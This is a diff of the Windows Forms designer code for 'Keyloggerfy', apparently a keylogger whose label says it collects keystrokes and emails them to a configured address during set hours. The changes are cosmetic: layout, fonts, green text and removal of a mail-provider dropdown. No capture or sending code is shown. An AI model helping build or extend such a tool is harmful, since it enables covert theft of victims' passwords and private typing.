@@ -40,11 +40,9 @@
             this.label7 = new System.Windows.Forms.Label();
             this.label6 = new System.Windows.Forms.Label();
             this.label5 = new System.Windows.Forms.Label();
-            this.label4 = new System.Windows.Forms.Label();
             this.label3 = new System.Windows.Forms.Label();
             this.label2 = new System.Windows.Forms.Label();
             this.label1 = new System.Windows.Forms.Label();
-            this.cboxMailProvider = new System.Windows.Forms.ComboBox();
             this.cboxTimeEnd = new System.Windows.Forms.ComboBox();
             this.cboxTimeStart = new System.Windows.Forms.ComboBox();
             this.txbPassword = new System.Windows.Forms.TextBox();
@@ -69,7 +67,7 @@
             this.panelBarraTitulo.Dock = System.Windows.Forms.DockStyle.Top;
             this.panelBarraTitulo.Location = new System.Drawing.Point(0, 0);
             this.panelBarraTitulo.Name = "panelBarraTitulo";
-            this.panelBarraTitulo.Size = new System.Drawing.Size(610, 29);
+            this.panelBarraTitulo.Size = new System.Drawing.Size(577, 29);
             this.panelBarraTitulo.TabIndex = 0;
             this.panelBarraTitulo.MouseMove += new System.Windows.Forms.MouseEventHandler(this.panelBarraTitulo_MouseMove);
             // 
@@ -89,7 +87,7 @@
             this.btnMinimizar.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.btnMinimizar.Cursor = System.Windows.Forms.Cursors.Hand;
             this.btnMinimizar.Image = ((System.Drawing.Image)(resources.GetObject("btnMinimizar.Image")));
-            this.btnMinimizar.Location = new System.Drawing.Point(562, 9);
+            this.btnMinimizar.Location = new System.Drawing.Point(529, 9);
             this.btnMinimizar.Margin = new System.Windows.Forms.Padding(2);
             this.btnMinimizar.Name = "btnMinimizar";
             this.btnMinimizar.Size = new System.Drawing.Size(12, 13);
@@ -103,7 +101,7 @@
             this.btnCerrar.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
             this.btnCerrar.Cursor = System.Windows.Forms.Cursors.Hand;
             this.btnCerrar.Image = ((System.Drawing.Image)(resources.GetObject("btnCerrar.Image")));
-            this.btnCerrar.Location = new System.Drawing.Point(587, 9);
+            this.btnCerrar.Location = new System.Drawing.Point(554, 9);
             this.btnCerrar.Margin = new System.Windows.Forms.Padding(2);
             this.btnCerrar.Name = "btnCerrar";
             this.btnCerrar.Size = new System.Drawing.Size(12, 13);
@@ -123,11 +121,9 @@
             this.panelMain.Controls.Add(this.label7);
             this.panelMain.Controls.Add(this.label6);
             this.panelMain.Controls.Add(this.label5);
-            this.panelMain.Controls.Add(this.label4);
             this.panelMain.Controls.Add(this.label3);
             this.panelMain.Controls.Add(this.label2);
             this.panelMain.Controls.Add(this.label1);
-            this.panelMain.Controls.Add(this.cboxMailProvider);
             this.panelMain.Controls.Add(this.cboxTimeEnd);
             this.panelMain.Controls.Add(this.cboxTimeStart);
             this.panelMain.Controls.Add(this.txbPassword);
@@ -137,7 +133,7 @@
             this.panelMain.Dock = System.Windows.Forms.DockStyle.Fill;
             this.panelMain.Location = new System.Drawing.Point(0, 29);
             this.panelMain.Name = "panelMain";
-            this.panelMain.Size = new System.Drawing.Size(610, 564);
+            this.panelMain.Size = new System.Drawing.Size(577, 564);
             this.panelMain.TabIndex = 1;
             // 
             // button1
@@ -147,8 +143,8 @@
             this.button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Gray;
             this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.button1.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.button1.Location = new System.Drawing.Point(555, 506);
+            this.button1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.button1.Location = new System.Drawing.Point(522, 506);
             this.button1.Name = "button1";
             this.button1.Size = new System.Drawing.Size(43, 46);
             this.button1.TabIndex = 17;
@@ -159,8 +155,8 @@
             // 
             this.label9.AutoSize = true;
             this.label9.BackColor = System.Drawing.Color.Transparent;
-            this.label9.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.label9.Location = new System.Drawing.Point(233, 286);
+            this.label9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.label9.Location = new System.Drawing.Point(275, 289);
             this.label9.Name = "label9";
             this.label9.Size = new System.Drawing.Size(53, 13);
             this.label9.TabIndex = 16;
@@ -170,8 +166,8 @@
             // 
             this.label8.AutoSize = true;
             this.label8.BackColor = System.Drawing.Color.Transparent;
-            this.label8.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.label8.Location = new System.Drawing.Point(73, 286);
+            this.label8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.label8.Location = new System.Drawing.Point(76, 289);
             this.label8.Name = "label8";
             this.label8.Size = new System.Drawing.Size(56, 13);
             this.label8.TabIndex = 15;
@@ -182,7 +178,7 @@
             this.label7.AutoSize = true;
             this.label7.BackColor = System.Drawing.Color.Transparent;
             this.label7.Font = new System.Drawing.Font("Arial", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.label7.ForeColor = System.Drawing.SystemColors.ControlLightLight;
+            this.label7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
             this.label7.Location = new System.Drawing.Point(76, 42);
             this.label7.Name = "label7";
             this.label7.Size = new System.Drawing.Size(323, 144);
@@ -194,8 +190,8 @@
             this.label6.AutoSize = true;
             this.label6.BackColor = System.Drawing.Color.Transparent;
             this.label6.Font = new System.Drawing.Font("Microsoft Yi Baiti", 5.25F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.label6.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.label6.Location = new System.Drawing.Point(405, 3);
+            this.label6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.label6.Location = new System.Drawing.Point(381, 0);
             this.label6.Name = "label6";
             this.label6.Size = new System.Drawing.Size(193, 224);
             this.label6.TabIndex = 13;
@@ -206,31 +202,20 @@
             this.label5.AutoSize = true;
             this.label5.BackColor = System.Drawing.Color.Transparent;
             this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.label5.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.label5.Location = new System.Drawing.Point(43, 236);
+            this.label5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.label5.Location = new System.Drawing.Point(54, 227);
             this.label5.Name = "label5";
             this.label5.Size = new System.Drawing.Size(356, 32);
             this.label5.TabIndex = 12;
             this.label5.Text = "       Keyloggerfy will collect keystrokes and send them \r\nto the \"mail to\" addre" +
     "ss between the hours specified below:";
             // 
-            // label4
-            // 
-            this.label4.AutoSize = true;
-            this.label4.BackColor = System.Drawing.Color.Transparent;
-            this.label4.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.label4.Location = new System.Drawing.Point(392, 434);
-            this.label4.Name = "label4";
-            this.label4.Size = new System.Drawing.Size(71, 13);
-            this.label4.TabIndex = 11;
-            this.label4.Text = "Mail Provider:";
-            // 
             // label3
             // 
             this.label3.AutoSize = true;
             this.label3.BackColor = System.Drawing.Color.Transparent;
-            this.label3.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.label3.Location = new System.Drawing.Point(233, 435);
+            this.label3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.label3.Location = new System.Drawing.Point(275, 438);
             this.label3.Name = "label3";
             this.label3.Size = new System.Drawing.Size(56, 13);
             this.label3.TabIndex = 10;
@@ -240,8 +225,8 @@
             // 
             this.label2.AutoSize = true;
             this.label2.BackColor = System.Drawing.Color.Transparent;
-            this.label2.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.label2.Location = new System.Drawing.Point(76, 435);
+            this.label2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.label2.Location = new System.Drawing.Point(79, 438);
             this.label2.Name = "label2";
             this.label2.Size = new System.Drawing.Size(55, 13);
             this.label2.TabIndex = 9;
@@ -251,30 +236,17 @@
             // 
             this.label1.AutoSize = true;
             this.label1.BackColor = System.Drawing.Color.Transparent;
-            this.label1.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.label1.Location = new System.Drawing.Point(73, 363);
+            this.label1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.label1.Location = new System.Drawing.Point(76, 366);
             this.label1.Name = "label1";
             this.label1.Size = new System.Drawing.Size(45, 13);
             this.label1.TabIndex = 8;
             this.label1.Text = "Mail To:";
             // 
-            // cboxMailProvider
-            // 
-            this.cboxMailProvider.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
-            this.cboxMailProvider.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.cboxMailProvider.FormattingEnabled = true;
-            this.cboxMailProvider.Items.AddRange(new object[] {
-            "Gmail",
-            "Hotmail",
-            "Outlook"});
-            this.cboxMailProvider.Location = new System.Drawing.Point(395, 450);
-            this.cboxMailProvider.Name = "cboxMailProvider";
-            this.cboxMailProvider.Size = new System.Drawing.Size(121, 21);
-            this.cboxMailProvider.TabIndex = 7;
-            // 
             // cboxTimeEnd
             // 
             this.cboxTimeEnd.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
+            this.cboxTimeEnd.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.cboxTimeEnd.ForeColor = System.Drawing.SystemColors.ControlLightLight;
             this.cboxTimeEnd.FormattingEnabled = true;
             this.cboxTimeEnd.Items.AddRange(new object[] {
@@ -302,14 +274,15 @@
             "22",
             "23",
             "24"});
-            this.cboxTimeEnd.Location = new System.Drawing.Point(236, 302);
+            this.cboxTimeEnd.Location = new System.Drawing.Point(278, 305);
             this.cboxTimeEnd.Name = "cboxTimeEnd";
-            this.cboxTimeEnd.Size = new System.Drawing.Size(121, 21);
+            this.cboxTimeEnd.Size = new System.Drawing.Size(121, 24);
             this.cboxTimeEnd.TabIndex = 6;
             // 
             // cboxTimeStart
             // 
             this.cboxTimeStart.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
+            this.cboxTimeStart.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.cboxTimeStart.ForeColor = System.Drawing.SystemColors.ControlLightLight;
             this.cboxTimeStart.FormattingEnabled = true;
             this.cboxTimeStart.Items.AddRange(new object[] {
@@ -337,43 +310,43 @@
             "22",
             "23",
             "24"});
-            this.cboxTimeStart.Location = new System.Drawing.Point(76, 302);
+            this.cboxTimeStart.Location = new System.Drawing.Point(79, 305);
             this.cboxTimeStart.Name = "cboxTimeStart";
-            this.cboxTimeStart.Size = new System.Drawing.Size(121, 21);
+            this.cboxTimeStart.Size = new System.Drawing.Size(121, 24);
             this.cboxTimeStart.TabIndex = 5;
             // 
             // txbPassword
             // 
             this.txbPassword.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
             this.txbPassword.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
-            this.txbPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txbPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.txbPassword.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.txbPassword.Location = new System.Drawing.Point(233, 451);
+            this.txbPassword.Location = new System.Drawing.Point(275, 454);
             this.txbPassword.Name = "txbPassword";
             this.txbPassword.PasswordChar = '*';
-            this.txbPassword.Size = new System.Drawing.Size(124, 21);
+            this.txbPassword.Size = new System.Drawing.Size(124, 22);
             this.txbPassword.TabIndex = 3;
             // 
             // txbMailFrom
             // 
             this.txbMailFrom.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
             this.txbMailFrom.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
-            this.txbMailFrom.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txbMailFrom.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.txbMailFrom.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.txbMailFrom.Location = new System.Drawing.Point(76, 451);
+            this.txbMailFrom.Location = new System.Drawing.Point(79, 454);
             this.txbMailFrom.Name = "txbMailFrom";
-            this.txbMailFrom.Size = new System.Drawing.Size(124, 21);
+            this.txbMailFrom.Size = new System.Drawing.Size(124, 22);
             this.txbMailFrom.TabIndex = 2;
             // 
             // txbMailTo
             // 
             this.txbMailTo.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
             this.txbMailTo.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
-            this.txbMailTo.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txbMailTo.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.txbMailTo.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.txbMailTo.Location = new System.Drawing.Point(76, 379);
+            this.txbMailTo.Location = new System.Drawing.Point(79, 382);
             this.txbMailTo.Name = "txbMailTo";
-            this.txbMailTo.Size = new System.Drawing.Size(121, 21);
+            this.txbMailTo.Size = new System.Drawing.Size(121, 22);
             this.txbMailTo.TabIndex = 1;
             // 
             // btnComenzar
@@ -382,11 +355,11 @@
             this.btnComenzar.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent;
             this.btnComenzar.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Gray;
             this.btnComenzar.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
-            this.btnComenzar.Font = new System.Drawing.Font("Microsoft Sans Serif", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.btnComenzar.ForeColor = System.Drawing.SystemColors.ControlLightLight;
-            this.btnComenzar.Location = new System.Drawing.Point(76, 506);
+            this.btnComenzar.Font = new System.Drawing.Font("Verdana", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnComenzar.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(103)))), ((int)(((byte)(255)))), ((int)(((byte)(56)))));
+            this.btnComenzar.Location = new System.Drawing.Point(79, 506);
             this.btnComenzar.Name = "btnComenzar";
-            this.btnComenzar.Size = new System.Drawing.Size(440, 46);
+            this.btnComenzar.Size = new System.Drawing.Size(320, 46);
             this.btnComenzar.TabIndex = 0;
             this.btnComenzar.Text = "Start";
             this.btnComenzar.UseVisualStyleBackColor = false;
@@ -400,18 +373,19 @@
             this.panelContenedor.Location = new System.Drawing.Point(0, 0);
             this.panelContenedor.Margin = new System.Windows.Forms.Padding(2);
             this.panelContenedor.Name = "panelContenedor";
-            this.panelContenedor.Size = new System.Drawing.Size(610, 593);
+            this.panelContenedor.Size = new System.Drawing.Size(577, 593);
             this.panelContenedor.TabIndex = 1;
             // 
             // main
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(610, 593);
+            this.ClientSize = new System.Drawing.Size(577, 593);
             this.Controls.Add(this.panelContenedor);
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.Name = "main";
-            this.Opacity = 0.8D;
+            this.Opacity = 0.85D;
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
             this.Text = "main";
             this.panelBarraTitulo.ResumeLayout(false);
@@ -439,9 +413,7 @@
         private System.Windows.Forms.TextBox txbMailTo;
         private System.Windows.Forms.ComboBox cboxTimeEnd;
         private System.Windows.Forms.ComboBox cboxTimeStart;
-        private System.Windows.Forms.ComboBox cboxMailProvider;
         private System.Windows.Forms.Label label1;
-        private System.Windows.Forms.Label label4;
         private System.Windows.Forms.Label label3;
         private System.Windows.Forms.Label label2;
         private System.Windows.Forms.Label label5;
